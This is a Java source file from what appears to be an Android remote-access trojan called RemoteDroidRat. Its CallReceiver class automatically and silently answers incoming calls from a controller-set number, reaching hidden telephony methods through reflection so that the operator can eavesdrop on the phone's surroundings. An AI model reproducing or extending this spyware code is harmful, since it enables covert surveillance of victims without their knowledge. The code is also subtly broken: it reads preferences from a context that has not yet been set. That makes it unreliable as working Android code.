package com.KaranKumar.RemoteDroidRat.commandActions;

import android.content.Context;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import java.lang.reflect.Method;
import android.content.SharedPreferences;
import com.KaranKumar.RemoteDroidRat.adminInfo;

public class CallReceiver extends PhoneStateListener {

    private Context context;
	private SharedPreferences sharedPreferences = context.getSharedPreferences("accept", Context.MODE_PRIVATE);
	private adminInfo admin;
    public CallReceiver(Context context) {
        this.context = context;
		this.admin = new adminInfo(context);
    }

    @Override
    public void onCallStateChanged(int state, String incomingNumber) {
        super.onCallStateChanged(state, incomingNumber);

        switch (state) {
            case TelephonyManager.CALL_STATE_RINGING:
                // Check if the incoming number matches the specific number
                if (incomingNumber.equals(sharedPreferences.getString("acceptNumber", admin.getMobileNo()))) {
                    // Accept the call programmatically
                    acceptCall();
                }
                break;
				// Handle other call states as needed
        }
    }

    private void acceptCall() {
        try {
            // Use reflection to access the internal telephony method
            TelephonyManager telephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            Class<?> telephonyClass = Class.forName(telephony.getClass().getName());
            Method method = telephonyClass.getDeclaredMethod("getITelephony");
            method.setAccessible(true);

            // Invoke the accept call method
            Object telephonyService = method.invoke(telephony);
            Class<?> telephonyServiceClass = Class.forName(telephonyService.getClass().getName());
            Method answerCallMethod = telephonyServiceClass.getDeclaredMethod("answerRingingCall");
            answerCallMethod.invoke(telephonyService);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
